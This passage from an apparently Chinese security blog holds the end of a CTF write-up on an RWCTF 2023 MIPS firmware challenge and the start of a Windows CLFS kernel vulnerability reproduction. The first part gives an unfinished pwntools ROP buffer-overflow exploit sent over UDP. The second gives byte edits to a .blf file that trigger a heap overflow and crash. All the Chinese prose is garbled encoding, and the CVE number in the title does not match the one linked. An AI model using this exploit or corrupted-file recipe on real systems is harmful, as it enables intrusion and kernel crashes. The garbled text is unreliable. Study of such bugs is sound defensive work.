start="3"><li><code>sudo gedit /etc/qemu-ifup</code> ï¼ˆæœ€åæ·»åŠ å‡ è¡Œï¼‰</li></ol><pre><code class="hljs routeros"><span class="hljs-comment">#! /bin/sh</span><span class="hljs-comment"># Script to bring a network (tap) device for qemu up.</span><span class="hljs-comment"># The idea is to add the tap device to the same bridge</span><span class="hljs-comment"># as we have default routing to.</span><span class="hljs-comment"># in order to be able to find brctl</span><span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:/sbin:/usr/sbin<span class="hljs-attribute">ip</span>=$(which ip)<span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$ip</span>&quot;</span> ]; then  <span class="hljs-built_in"> ip </span>link <span class="hljs-builtin-name">set</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> up<span class="hljs-keyword">else</span>   <span class="hljs-attribute">brctl</span>=$(which brctl)   <span class="hljs-keyword">if</span> [ ! <span class="hljs-string">&quot;<span class="hljs-variable">$ip</span>&quot;</span> -o ! <span class="hljs-string">&quot;<span class="hljs-variable">$brctl</span>&quot;</span> ]; then     echo <span class="hljs-string">&quot;W: <span class="hljs-variable">$0</span>: not doing any bridge processing: neither ip nor brctl utility not found&quot;</span> &gt;&amp;2     exit 0   fi   ifconfig <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> 0.0.0.0 upfi<span class="hljs-attribute">switch</span>=$(ip<span class="hljs-built_in"> route </span>ls | \    awk <span class="hljs-string">&#x27;/^default / &#123;</span><span class="hljs-string">          for(i=0;i&lt;NF;i++) &#123; if ($i == &quot;dev&quot;) &#123; print $(i+1); next; &#125; &#125;</span><span class="hljs-string">         &#125;&#x27;</span>        )<span class="hljs-comment"># only add the interface to default-route bridge if we</span><span class="hljs-comment"># have such interface (with default route) and if that</span><span class="hljs-comment"># interface is actually a bridge.</span><span class="hljs-comment"># It is possible to have several default routes too</span><span class="hljs-keyword">for</span> br <span class="hljs-keyword">in</span> <span class="hljs-variable">$switch</span>; <span class="hljs-keyword">do</span>    <span class="hljs-keyword">if</span> [ -d /sys/class/net/<span class="hljs-variable">$br</span>/bridge/. ]; then        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$ip</span>&quot;</span> ]; then         <span class="hljs-built_in"> ip </span>link <span class="hljs-builtin-name">set</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> master <span class="hljs-string">&quot;<span class="hljs-variable">$br</span>&quot;</span>        <span class="hljs-keyword">else</span>          brctl addif <span class="hljs-variable">$br</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>        fi        exit# exit with status of the previous command    fidoneecho <span class="hljs-string">&quot;W: <span class="hljs-variable">$0</span>: no bridge for guest interface found&quot;</span> &gt;&amp;2<span class="hljs-comment">################################################################</span><span class="hljs-comment">#!/bin/sh</span>sudo /sbin/ifconfig <span class="hljs-variable">$1</span> 0.0.0.0 promisc upsudo /sbin/brctl addif br0 <span class="hljs-variable">$1</span>sleep 3</code></pre><ol start="4"><li><code>sudo chmod a+x /etc/qemu-ifup</code></li><li><code>sudo service network-manager restart</code> é‡å¯æœåŠ¡</li><li><code>sudo ifconfig ens33 down</code> å…³é—­<code>ens33</code></li><li><code>sudo ifup br0</code> èµ·<code>br0</code>æ¡¥æ¥ï¼Œçœ‹åˆ°ç±»ä¼¼å¦‚ä¸‹å†…å®¹å³æˆåŠŸäº†<pre><code class="hljs angelscript">Internet Systems Consortium DHCP Client <span class="hljs-number">4.4</span><span class="hljs-number">.1</span>Copyright <span class="hljs-number">2004</span><span class="hljs-number">-2018</span> Internet Systems Consortium.All rights reserved.For info, please visit https:<span class="hljs-comment">//www.isc.org/software/dhcp/</span>Listening on LPF/br0/<span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:ae:<span class="hljs-number">1</span>b:<span class="hljs-number">28</span>Sending on   LPF/br0/<span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:ae:<span class="hljs-number">1</span>b:<span class="hljs-number">28</span>Sending on   Socket/fallbackCreated duid <span class="hljs-string">&quot;\000\001\000\001+J\377\&quot;\000\014)\256\033(&quot;</span>.DHCPDISCOVER on br0 to <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span> port <span class="hljs-number">67</span> <span class="hljs-built_in">int</span>erval <span class="hljs-number">3</span> (xid=<span class="hljs-number">0xcab4930e</span>)DHCPOFFER of <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.254</span>DHCPREQUEST <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> on br0 to <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span> port <span class="hljs-number">67</span> (xid=<span class="hljs-number">0xe93b4ca</span>)DHCPACK of <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.254</span> (xid=<span class="hljs-number">0xcab4930e</span>)bound to <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> -- renewal <span class="hljs-keyword">in</span> <span class="hljs-number">853</span> seconds.</code></pre></li></ol><p>é€šè¿‡<code>ifconfig</code>çœ‹<code>ip</code></p><p>æˆ–è€…é€šè¿‡å¦‚ä¸‹é“¾æ¥çš„æ–¹æ³•åˆ›å»ºç½‘æ¡¥</p><blockquote><p><a href="http://wiki.yanick.site/wiki/os/qemu/">http://wiki.yanick.site/wiki/os/qemu/</a></p></blockquote><p>é€šè¿‡å¦‚ä¸‹å‘½ä»¤ï¼Œèµ·<code>qemu system</code></p><pre><code class="hljs shell">sudo qemu-system-mips -M malta \    -kernel vmlinux-2.6.32-5-4kc-malta \    -hda debian_squeeze_mips_standard.qcow2 \    -append &quot;root=/dev/sda1 console=tty0&quot; \    -net nic \    -net tap \    -nographic</code></pre><p>é€šè¿‡å¦‚ä¸‹æŒ‡ä»¤è¿›è¡Œï¼Œåˆ‡æ¢ç³»ç»Ÿ</p><pre><code class="hljs awk">scp -r .<span class="hljs-regexp">/squashfs-root/</span> root@<span class="hljs-number">192.168</span>.<span class="hljs-number">152.133</span>:<span class="hljs-regexp">/root/</span>chroot <span class="hljs-regexp">/root/</span>squashfs-root sh</code></pre><h3 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu-user"></a>qemu-user</h3><p>å½“æ‰¾åˆ°æ ¸å¿ƒå…³é”®çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹åï¼Œé€šè¿‡å¦‚ä¸‹æŒ‡ä»¤è¿›è¡Œè°ƒè¯•</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> qemu-mips -g <span class="hljs-number">12345</span> -L . ./usr/sbin/ipfind eth<span class="hljs-number">0</span></code></pre><p><code>gdbscript</code>å¦‚ä¸‹</p><pre><code class="hljs awk"><span class="hljs-comment"># set architecture mips</span><span class="hljs-comment"># set endian big</span>file <span class="hljs-regexp">/mnt/</span>d<span class="hljs-regexp">/Desktop/</span>ctf<span class="hljs-regexp">/rwctf2023/</span>firmware<span class="hljs-regexp">/_firmware.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/usr/</span>sbin/ipfindset sysroot <span class="hljs-regexp">/mnt/</span>d<span class="hljs-regexp">/Desktop/</span>ctf<span class="hljs-regexp">/rwctf2023/</span>firmware<span class="hljs-regexp">/_firmware.bin.extracted/</span>squashfs-roottarget remote:<span class="hljs-number">12345</span>tb *<span class="hljs-number">0</span>x401088tb *<span class="hljs-number">0</span>x401078</code></pre><h3 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h3><p>å¯ä»¥ç›´æ¥é€šè¿‡<code>AttifyOS</code>ä¸­çš„<code>firmadyne</code>ç›´æ¥è¿è¡Œ</p><p>æœ€å¥½çš„æ˜¯ï¼Œè¯¥ç³»ç»Ÿå¯ä»¥ç›´æ¥è¿è¡Œå›ºä»¶ç³»ç»Ÿè‡ªå¯æ—¶çš„ä¸€äº›æœåŠ¡ï¼Œä»è€Œç›´æ¥çœ‹åˆ°ä»€ä¹ˆæœåŠ¡æ˜¯è‡ªå¯çš„ï¼Œè€Œä¸ç”¨è‡ªå·±å»æ‰¾</p><p>å½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±æŸ¥çœ‹<code>/etc/rc.d/rcS.d/</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>å†™<code>exp</code>çš„æ—¶å€™ï¼Œå®è¯è¯´ï¼Œå¾ˆä¹…æ²¡å†™è¿‡<code>mips rop</code>å°±åŸºæœ¬ä¸æ€ä¹ˆä¼šå†™äº†ï¼Œä¸€å¼€å§‹å®Œå…¨æ²¡æ³¨æ„åˆ°æ˜¯<code>NX disabled</code>çš„ï¼Œç„¶åå¯¹äºåº“å‡½æ•°çš„ä½¿ç”¨ï¼Œæœ€å¼€å§‹çš„æ—¶å€™æ²¡æ¢å¤<code>$gp</code>ï¼Œåé¢å†å†™çš„æ—¶å€™åŸºæœ¬å°±æ—¶é—´ä¸å¤Ÿäº†</p><p>ä¸€ä¸ªæœªå†™å®Œçš„<code>exp</code></p><pre><code class="hljs routeros">import socketimport sys<span class="hljs-keyword">from</span> pwn import *import base64TARGET_IP = <span class="hljs-string">&quot;172.25.67.200&quot;</span>TARGET_PORT = 62720bufferSize          = 1024serverAddressPort   = (TARGET_IP, TARGET_PORT)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>io = remote(TARGET_IP, TARGET_PORT, <span class="hljs-attribute">typ</span>=<span class="hljs-string">&quot;udp&quot;</span>)def leakMacAddress():    # leak    msgFromClient = b<span class="hljs-string">&#x27;FIVI&#x27;</span>    msgFromClient += b<span class="hljs-string">&#x27;1234&#x27;</span>    # mac    # 52 54 00 12 34 56    #msgFromClient += b<span class="hljs-string">&#x27;\x52\x54\x00\x12\x34\x56&#x27;</span>    msgFromClient += p8(10)    msgFromClient += p8(1) # magic <span class="hljs-keyword">to</span> bypass 1 check at 0x402684    msgFromClient += p8(0) # bypass at 0x40268C    msgFromClient += p8(4)    msgFromClient += b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x4    msgFromClient += b<span class="hljs-string">&#x27;8&#x27;</span>    msgFromClient += b<span class="hljs-string">&#x27;\xff&#x27;</span><span class="hljs-number">*6</span> # maybe fake mac address    msgFromClient += p16(0) # v8    msgFromClient += p32(0) # v17    msgFromClient += b<span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-number">*0</span>x20    io.sendline(msgFromClient)def pwn():    # 0x00400e40: addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>); jr <span class="hljs-variable">$ra</span>; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20;    # .text:004020B0  move <span class="hljs-variable">$a0</span>, <span class="hljs-variable">$s0</span>;    # .text:00400F3C    # 0x00400d70: lw <span class="hljs-variable">$t9</span>, (<span class="hljs-variable">$s0</span>); addiu <span class="hljs-variable">$s1</span>, <span class="hljs-variable">$s1</span>, 1; move <span class="hljs-variable">$a2</span>, <span class="hljs-variable">$s5</span>; move <span class="hljs-variable">$a1</span>, <span class="hljs-variable">$s4</span>; jalr <span class="hljs-variable">$t9</span>; move <span class="hljs-variable">$a0</span>, <span class="hljs-variable">$s3</span>;    # .text:00401220    # 0x00400c9c : lw <span class="hljs-variable">$gp</span>, 0x10(<span class="hljs-variable">$sp</span>) ; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>) ; jr <span class="hljs-variable">$ra</span> ; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20    # 00402ac0 : lw <span class="hljs-variable">$gp</span>, 0x10(<span class="hljs-variable">$sp</span>) ; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>) ; jr <span class="hljs-variable">$ra</span> ; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20    # 0x41b030    gp = b<span class="hljs-string">&quot;\x00\x41\xb0\x30&quot;</span>    # lw <span class="hljs-variable">$gp</span>, 0x10(<span class="hljs-variable">$sp</span>) ; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>) ; jr <span class="hljs-variable">$ra</span> ; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20    gadget1 = b<span class="hljs-string">&quot;\x00\x40\x2A\xC0&quot;</span>    # call sendto    gadget2 = b<span class="hljs-string">&quot;\x00\x40\x1D\x7C&quot;</span>    # addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>); jr <span class="hljs-variable">$ra</span>; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20;    gadget3 = b<span class="hljs-string">&quot;\x00\x40\x0e\x40&quot;</span>    payload = b<span class="hljs-string">&quot;A&quot;</span><span class="hljs-number">*0</span>x240+b<span class="hljs-string">&quot;B&quot;</span><span class="hljs-number">*0</span>x4+b<span class="hljs-string">&quot;C&quot;</span><span class="hljs-number">*0</span>x4+b<span class="hljs-string">&quot;D&quot;</span><span class="hljs-number">*0</span>x4    # 0x402ac0: <span class="hljs-builtin-name">set</span> gp    payload += gadget1    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x10    # <span class="hljs-variable">$gp</span>: 0x41b030    payload += gp    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x8    payload += gadget3    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x20    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x1c    payload += gadget3    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x4    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x20    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x1c    payload += gadget2    msgFromClient = b<span class="hljs-string">&#x27;FIVI&#x27;</span>    msgFromClient += b<span class="hljs-string">&#x27;1234&#x27;</span>    # mac    # 52 54 00 12 34 56    #msgFromClient += b<span class="hljs-string">&#x27;\x52\x54\x00\x12\x34\x56&#x27;</span>    msgFromClient += p8(10)    msgFromClient += p8(2) # magic <span class="hljs-keyword">to</span> bypass 1 check at 0x402684    msgFromClient += p8(0) # bypass at 0x40268C    msgFromClient += p8(4)    msgFromClient += b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x4    msgFromClient += b<span class="hljs-string">&#x27;8&#x27;</span>    # msgFromClient += b<span class="hljs-string">&#x27;\x52\x54\x00\x12\x34\x56&#x27;</span> # maybe fake mac address    msgFromClient += b<span class="hljs-string">&#x27;\x00\x15\x5d\xb3\x71\x6a&#x27;</span> # maybe fake mac address    msgFromClient += p16(0) # v8    msgFromClient += p32(0x8E) # v17    msgFromClient += b<span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-number">*0</span>x40  # username    msgFromClient += base64.b64encode(payload)    io.sendline(msgFromClient)pwn()io.interactive()</code></pre><p>å®˜æ–¹<a href="https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ">exp</a></p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>ä¹‹å‰ç¿»åˆ°å¦å¤–ä¸€ä¸ªé•œåƒçš„ä»“åº“ï¼Œä½†æ˜¯è¿™ä¸ªä»“åº“é‡Œçš„é•œåƒä¸èƒ½èµ·èµ·æ¥ï¼Œå¯èƒ½æ˜¯æˆ‘ç”¨æ³•æ²¡ç”¨å¯¹</p><blockquote><p><a href="https://people.debian.org/~jcowgill/qemu-mips/">https://people.debian.org/~jcowgill/qemu-mips/</a></p></blockquote><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://www.freebuf.com/vuls/228726.html">https://www.freebuf.com/vuls/228726.html</a><br><a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a><br><a href="https://gist.github.com/extremecoders-re/3ddddce9416fc8b293198cd13891b68c">https://gist.github.com/extremecoders-re/3ddddce9416fc8b293198cd13891b68c</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mips</tag>
      
      <tag>firmware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-37696 æ¼æ´å¤ç°</title>
    <link href="/2022/10/22/CVE-2022-37696%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/10/22/CVE-2022-37696%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><pre><code class="hljs angelscript">è™šæ‹Ÿæœºï¼šWin10 <span class="hljs-number">21</span>h2 <span class="hljs-number">19044.1889</span>ç‰©ç†æœºï¼šWin10debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><p>ç¯å¢ƒæˆ‘ä½¿ç”¨çš„æ˜¯<code>Win10 21h2</code>å®˜æ–¹8æœˆçš„ç‰ˆæœ¬</p><h2 id="ç®€è¿°æ¼æ´"><a href="#ç®€è¿°æ¼æ´" class="headerlink" title="ç®€è¿°æ¼æ´"></a>ç®€è¿°æ¼æ´</h2><p>åœ¨<code>blf</code>æ–‡ä»¶<code>Base Log Record</code>åŒºåŸŸçš„<code>cbSymbolZone</code>å­—æ®µçš„æ£€æµ‹è¢«ç»•è¿‡ï¼Œä»è€Œå¯¼è‡´ç•¸å½¢çš„<code>cbSymbolZone</code>ï¼ˆå³è¶Šç•Œçš„<code>cbSymbolZone</code>ï¼‰å¯ä»¥è¢«ä½¿ç”¨ï¼Œä»è€Œå¯ä»¥åœ¨ä»»æ„åç§»ä½ç½®è¿›è¡Œè¶Šç•Œå†™ã€‚</p><p>è¿™ä¸ªæ£€æµ‹è¢«ç»•è¿‡ï¼Œè·Ÿ<code>Base Log Record</code>åŒºåŸŸå¤´çš„<code>SignaturesOffset</code>å­—æ®µç›¸å…³ï¼ŒåŸæœ¬åˆ©ç”¨<code>SignaturesOffset</code>å­—æ®µè¿›è¡Œæ£€æµ‹ï¼Œä½†æ˜¯å­˜åœ¨å¦å¤–ä¸€ä¸ªæ¼æ´ï¼Œåˆ©ç”¨ä¸æ­£ç¡®çš„<code>SignaturesOffset</code>ï¼Œå¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™å…¥<code>0xffff</code>ï¼Œä»è€Œåˆè¦†ç›–<code>SignaturesOffset</code>é«˜ä½çš„2ä¸ªå­—èŠ‚ï¼Œä»è€Œå¯ä»¥ä½¿å¾—å¤§æ•°<code>cbSymbolZone</code>å¯ä»¥ç»•è¿‡æ£€æµ‹</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="POC-æ€»è§ˆ"><a href="#POC-æ€»è§ˆ" class="headerlink" title="POC æ€»è§ˆ"></a>POC æ€»è§ˆ</h3><p>å¯ä»¥é€šè¿‡<a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part">å‚è€ƒé“¾æ¥</a>çš„<code>POC.png</code>å¯¹è¯¥æ¼æ´çš„åˆ©ç”¨è¿›è¡Œå¤§æ¦‚äº†è§£</p><p><img src="/img/CVE-2022-37696/POC.png" alt="POC"></p><p>å…¶æ ¸å¿ƒä¸»è¦åœ¨æ­¥éª¤3çœç•¥çš„éƒ¨åˆ†ï¼Œå³å¯¹äºåˆå§‹åŒ–çš„<code>MyLog.blf</code>è¿›è¡Œä¿®æ”¹ï¼Œç„¶åå†å¯¹äºå·²ç»åšäº†æ”¹åŠ¨çš„<code>MyLog.blf</code>è¿›è¡Œè§£æï¼ˆP.S. å¦‚æœ<code>v51</code>æ— æ³•æ‰“å¼€æˆåŠŸçš„è¯ï¼Œå…¶å®å°±æ˜¯å·²ç»è¢«<code>patch</code>äº†ï¼‰ï¼Œå¹¶ä¸”åœ¨æ­¤æ—¶ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶è®¾ç½®æˆ<code>GENERIC_READ | GENERIC_WRITE | DELETE</code></p><p>æœ€ååœ¨<code>MyLog.blf</code>è¿›è¡Œ<code>AddLogContainer</code>ä¼šæº¢å‡ºè¦†ç›–åˆ°ä¹‹å‰<code>MyLxg_xxx.blf</code>çš„<code>pContainer</code>æŒ‡é’ˆä¸Šï¼Œä»è€Œå¯¼è‡´<code>BSOD</code></p><h3 id="MyLog-blf-çš„ä¿®æ”¹"><a href="#MyLog-blf-çš„ä¿®æ”¹" class="headerlink" title="MyLog.blf çš„ä¿®æ”¹"></a>MyLog.blf çš„ä¿®æ”¹</h3><p>å‚è€ƒé“¾æ¥çš„å¯¹äº<code>MyLog.blf</code>ä¿®æ”¹çš„å½’æ€»å¦‚ä¸‹ï¼ˆP.S. ä¸‹å›¾ä¸­çš„0x86Cæ˜¯å†™é”™äº†çš„ï¼Œåº”è¯¥æ˜¯<code>0x868</code>ï¼‰</p><p><img src="/img/CVE-2022-37696/010.png" alt="010"></p><p><img src="/img/CVE-2022-37696/diff.png" alt="diff"></p><p><strong>SignaturesOffset</strong></p><p><code>0x0868: |80 79 00 00| =&gt; |50 00 00 00|</code><br>è¿™ä¸ªä¿®æ”¹ä¸ç¡®å®šæœ‰æ²¡æœ‰ç”¨ï¼Œæœ€ç»ˆ<code>50 00 00 00</code>ä¼šè¢«æ¼æ´ä¿®æ”¹ä¸º<code>50 00 ff ff</code>ä»è€Œå®ç°ç»•è¿‡</p><p><strong>rgClients</strong></p><p><code>0x09a8: |68 13 00 00| =&gt; |30 1B 00 00|</code><br>ç›¸å½“äºæŠŠä¸€ä¸ª<code>0x1386</code>çš„<code>Offset</code>ä¿®æ”¹ä¸ºäº†<code>0x1B30</code>ï¼Œç›¸å½“äº<code>0x1BD8=0x1386+0x870</code>çš„<code>Client Context</code>è¢«å¼ƒç”¨ï¼Œåœ¨<code>0x23A0=0x1B30+0x870</code>çš„åœ°æ–¹ï¼Œé‡æ–°ä¼ªé€ äº†ä¸€ä¸ª<code>Client Context</code>ç»“æ„ä½“</p><p><strong>cbSymbolZone</strong></p><p><code>0x1B98: |F8 00 00 00| =&gt; |4B 11 01 00|        cbSymbolZone        0x1114B</code><br>æ”¹å¤§<code>cbSymbolZone</code>ï¼Œä»¥ä½¿å¾—<code>AddLogContainer</code>æ—¶ï¼Œä¼šé€ æˆå †è¶Šç•Œå†™</p><p><strong>Client Context</strong></p><p><code>0x2390: |00 00 00 00 00 00 00 00| =&gt; |B8 1B 00 00 30 1B 00 00|</code><br>è¯¥å­—æ®µçš„ä¿®æ”¹æ˜¯ä¸ºäº†ä¼ªé€ çš„<code>FakeClientContext</code>èƒ½è¿‡æ£€æµ‹</p><p><img src="/img/CVE-2022-37696/FakeClientContext.png" alt="FakeClientContext"><br>åœ¨<code>CLFS_LOG_STATE eState</code>å­—æ®µè®¾ç½®ä¸ºäº†<code>CLFS_LOG_SHUTDOWN 0x20</code></p><h3 id="ç•¸å½¢-SignaturesOffset-çš„å½±å“"><a href="#ç•¸å½¢-SignaturesOffset-çš„å½±å“" class="headerlink" title="ç•¸å½¢ SignaturesOffset çš„å½±å“"></a>ç•¸å½¢ SignaturesOffset çš„å½±å“</h3><p>æ„é€ äº†ä¸€ä¸ªç•¸å½¢çš„<code>.blf</code>ï¼Œç„¶åå†æ¬¡æ‰“å¼€æ—¶ï¼Œä¼šå¯¹äºè¯¥<code>blf</code>è¿›è¡Œè§£æ</p><p><code>HANDLE v51 = CreateLogFile(L&quot;LOG:C:\\Users\\Public\\MyLog&quot;, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL);</code></p><p>å‡½æ•°<code>CClfsLogFcbPhysical::Initialize</code>ä¼šè¿›è¡Œè§£æ</p><pre><code class="hljs apache"><span class="hljs-attribute">open</span> evil MyLog.blf<span class="hljs-attribute">0</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">56238</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">39</span>eaeb     CLFS!CClfsLogFcbPhysical::Initialize<span class="hljs-attribute">01</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">56240</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0</span>a<span class="hljs-number">2</span>b     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef<span class="hljs-attribute">02</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">56390</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">07</span>f<span class="hljs-number">7</span>     CLFS!CClfsRequest::Dispatch+<span class="hljs-number">0</span>x<span class="hljs-number">97</span><span class="hljs-attribute">03</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">563</span>e<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0747</span>     CLFS!ClfsDispatchIoRequest+<span class="hljs-number">0</span>x<span class="hljs-number">87</span></code></pre><p>P.S ä»¥ä¸‹è°ƒç”¨å‡½æ•°éƒ½æ˜¯ç”±<code>CClfsLogFcbPhysical::Initialize</code>å‡½æ•°ç›´æ¥è°ƒç”¨çš„ï¼Œéƒ½åœ¨<code>CClfsLogFcbPhysical::Initialize</code>å‡½æ•°ä¸­</p><h4 id="Signatures-æ•°ç»„çš„-Decode"><a href="#Signatures-æ•°ç»„çš„-Decode" class="headerlink" title="Signatures æ•°ç»„çš„ Decode"></a>Signatures æ•°ç»„çš„ Decode</h4><p>åœ¨<code>CClfsBaseFilePersisted::OpenImage</code>ä¸­ï¼Œä¸»è¦ä¼šæŠŠ<code>SignaturesOffset</code>åç§»å¤„çš„<code>Signatures</code>æ•°ç»„çš„å†…å®¹<code>Decode</code>å†™å…¥å†…å­˜å¯¹åº”ä½ç½®</p><p>ä¸‹å›¾ä¸º<code>CClfsLogFcbPhysical::Initialize</code>ä¸­å¯¹äº<code>CClfsBaseFilePersisted::OpenImage</code>çš„è°ƒç”¨</p><p><img src="/img/CVE-2022-37696/OpenImageIDA.png" alt="OpenImageIDA"></p><p>åœ¨ä¼šèµ°åˆ°<code>CClfsBaseFilePersisted::ReadMetadataBlock</code>æ—¶ï¼Œä¼šè°ƒç”¨<code>ClfsDecodeBlock</code>å®ç°ä¸Šè¿°<code>Decode</code>åŠŸèƒ½</p><p><img src="/img/CVE-2022-37696/ReadMetadataBlock.png" alt="ReadMetadataBlock"></p><p>è¿›å…¥<code>ClfsDecodeBlock</code>æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>f<span class="hljs-number">48</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">4192</span>     CLFS!ClfsDecodeBlock<span class="hljs-attribute">01</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>f<span class="hljs-number">50</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>aa<span class="hljs-number">395</span>     CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+<span class="hljs-number">0</span>x<span class="hljs-number">182</span><span class="hljs-attribute">02</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>ff<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>aa<span class="hljs-number">204</span>     CLFS!CClfsBaseFile::AcquireMetadataBlock+<span class="hljs-number">0</span>x<span class="hljs-number">45</span><span class="hljs-attribute">03</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41020</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">9</span>c<span class="hljs-number">36</span>     CLFS!CClfsBaseFilePersisted::ReadImage+<span 